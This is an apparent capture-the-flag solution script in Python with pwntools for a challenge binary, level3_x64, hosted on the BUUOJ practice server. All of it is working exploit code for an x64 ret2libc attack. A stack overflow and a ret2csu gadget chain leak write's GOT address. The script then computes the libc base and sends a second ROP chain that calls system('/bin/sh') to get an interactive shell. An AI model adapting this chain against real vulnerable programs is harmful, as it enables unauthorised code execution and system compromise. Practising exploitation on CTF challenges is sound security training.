#Made by fly_autumn
#x64 ret2libc
from pwn import *
#p = process("./level3_x64")
p = remote("node5.buuoj.cn",26075)
elf = ELF("./level3_x64")
context(os="linux",arch="amd64")
libc = ELF("./libc.so.6")

offset = 136
csu1 = 0x4006a6
csu2 = 0x400690
pop_rdi = 0x4006b3
write_got = elf.got["write"]
main_addr = elf.sym["main"]
def make_csu(more,rbx,rbp,r12,r13,r14,r15):
    payload = p64(more) + p64(rbx) + p64(rbp) + p64(r12) + p64(r13) + p64(r14) + p64(r15)
    return payload
#0,0,1,func_addr,rdx,rsi,rdi

p.recvuntil(b"Input:\n")
payload = b"\x00" * offset + p64(csu1) + make_csu(0,0,1,write_got,8,write_got,1) + p64(csu2) + make_csu(0,0,0,0,0,0,0) + p64(main_addr)
p.sendline(payload)
write_addr = u64(p.recv(6).ljust(8,b"\0"))

log.success("write addr: "+hex(write_addr))
libc_addr = write_addr - libc.sym["write"]
log.success("libc addr: "+hex(libc_addr))
sys_addr = libc_addr + libc.sym["system"]
log.success("sys addr: "+hex(sys_addr))
sh_addr = libc_addr + next(libc.search("/bin/sh"))
log.success("sh addr: "+hex(sh_addr))

p.recvuntil(b"Input:\n")
payload = b"\x00" * offset + p64(pop_rdi) + p64(sh_addr) + p64(sys_addr)
p.sendline(payload)

p.interactive()
